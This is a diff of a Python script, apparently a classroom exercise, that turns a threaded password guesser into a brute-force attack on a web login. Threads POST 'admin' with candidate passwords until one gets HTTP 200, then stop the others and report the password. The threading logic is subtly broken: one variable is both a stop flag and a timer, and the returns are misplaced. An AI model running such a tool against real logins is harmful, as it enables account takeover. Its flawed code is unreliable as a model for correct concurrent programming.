@@ -2,11 +2,15 @@ import threading
 import requests
 from datetime import datetime
 
+
 class Mi_hilo(threading.Thread):
     def __init__(self, contrasenas, url):
         self.url = url
+        self.contrasena = ''
         # Recibe los atributos de este hilo
         self.contrasenas = contrasenas
+        self.principio = datetime.now()
+        self.final = self.principio
         # Inicializa flag de finalización del hilo
         self.final = False
         # Inicializa el Thread, llamando a la superclase
@@ -17,14 +21,21 @@ class Mi_hilo(threading.Thread):
     def run(self): 
         with requests.session() as s:
             for contrasena in self.contrasenas:
-                    datos = {'username': 'admin','password':contrasena}
-                    peticion = s.post(self.url,data=datos)
-                    if  peticion.status_code == 200:
-                        for hilo in self.hilos:
-                            # No para el hilo actual
-                            if hilo!=self:
-                                hilo.stop()
-                        return
+                if self.final:
+                    return
+                datos = {'username': 'admin','password':contrasena}
+                peticion = s.post(self.url,data=datos)
+                if  peticion.status_code == 200:
+                    self.contrasena_correcta = contrasena
+                    for hilo in self.hilos:
+                        # No para el hilo actual
+                        if hilo!=self:
+                            hilo.stop()
+                            self.final = datetime.now() - self.principio
+                            print(self.final)
+                            return self.contrasena_correcta
+                    return None
+                    
     
     # Definimos stop() activando la flag de finalización
     def stop(self):
@@ -38,7 +49,7 @@ class Mi_hilo(threading.Thread):
     
 
 if __name__ == '__main__':
-
+    principio=datetime.now()
     n_hilos = 3
     lista_contrasenas = []
     contrasena = []
